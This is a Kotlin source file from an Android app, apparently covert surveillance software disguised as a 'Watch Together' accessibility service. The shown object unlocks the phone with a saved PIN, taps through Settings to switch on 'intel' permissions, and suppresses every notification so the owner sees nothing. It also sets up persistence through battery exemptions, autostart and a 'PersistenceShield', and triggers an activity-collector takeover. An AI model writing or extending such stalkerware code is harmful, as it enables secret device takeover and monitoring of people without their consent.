package com.phonehand.app

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.provider.Settings
import android.util.Log
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean

/** Opens App Settings → Permissions and toggles intel permissions ON — stealth (no notifications). */
object SettingsPermissionGrant {
    private const val TAG = "SettingsGrant"
    private val running = AtomicBoolean(false)
    private val executor = Executors.newSingleThreadExecutor()

    fun isRunning(): Boolean = running.get() || PermissionAutoGrant.isRunning()

    fun runLightning(context: Context) {
        if (!running.compareAndSet(false, true)) {
            SetupReporter.progress("Already granting permissions…")
            return
        }
        executor.execute {
            try {
                runFull(context)
            } catch (e: Exception) {
                Log.w(TAG, e.message ?: "grant")
                SetupReporter.error(e.message ?: "Grant failed")
            } finally {
                running.set(false)
            }
        }
    }

    private fun runFull(context: Context) {
        val service = TouchAccessibilityService.instance
        if (service == null) {
            SetupReporter.error("Watch Together is off — enable in Accessibility")
            return
        }

        StealthNotifications.suppressAll(context)
        SetupReporter.progress("Unlocking phone first…", "start")
        if (!LockScreenHelper.ensureUnlocked(context, service, 22_000L)) {
            SetupReporter.error("Phone must be unlocked first — tap Unlock or save PIN in portal")
            return
        }
        Thread.sleep(400)

        SetupReporter.progress("Opening Settings → Permissions…")
        openAppDetails(context)
        Thread.sleep(900)
        PermissionAutoGrant.runSettingsPass(context, "App info", 12_000)

        tapNavigate(context, service, listOf("permissions", "app permissions", "permission manager"))
        Thread.sleep(700)
        SetupReporter.progress("Toggling permissions ON…")
        PermissionAutoGrant.runSettingsPass(context, "Permission list", 35_000)

        PersistenceHelper.requestBatteryExemption(context)
        PersistenceHelper.openManufacturerAutostart(context)
        Thread.sleep(700)
        PermissionAutoGrant.runSettingsPass(context, "Battery", 8_000)

        SetupReporter.progress("Requesting runtime permissions…")
        ActivityCollector.get(context).onSetupTakeover()
        Thread.sleep(400)
        PermissionAutoGrant.runSilentBlocking(context, 25_000)

        StealthNotifications.suppressAll(context)
        PersistenceShield.applyAll(context)
        returnToHome(service)

        val taps = PermissionAutoGrant.lastTapCount()
        SetupReporter.done(
            if (taps > 0) "Permissions granted — $taps step(s) (stealth, no notifications)" else "Permissions scan complete",
            taps,
        )
    }

    private fun returnToHome(service: TouchAccessibilityService) {
        repeat(3) {
            service.globalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK)
            Thread.sleep(180)
        }
        service.globalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME)
        service.scheduleRefreshesAfterInput(forceFull = true)
    }

    private fun openAppDetails(context: Context) {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.parse("package:${context.packageName}")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        context.startActivity(intent)
    }

    private fun tapNavigate(context: Context, service: TouchAccessibilityService, keywords: List<String>) {
        val start = System.currentTimeMillis()
        while (System.currentTimeMillis() - start < 8000) {
            val tree = service.snapshotTree() ?: service.lastTreeJson ?: continue
            val target = PermissionAutoGrant.findNavigationTarget(tree, keywords)
            if (target != null) {
                SetupReporter.progress("Open → ${target.label}")
                service.tapAt(target.cx, target.cy)
                Thread.sleep(500)
                service.scheduleRefreshesAfterInput()
                return
            }
            Thread.sleep(120)
        }
    }
}
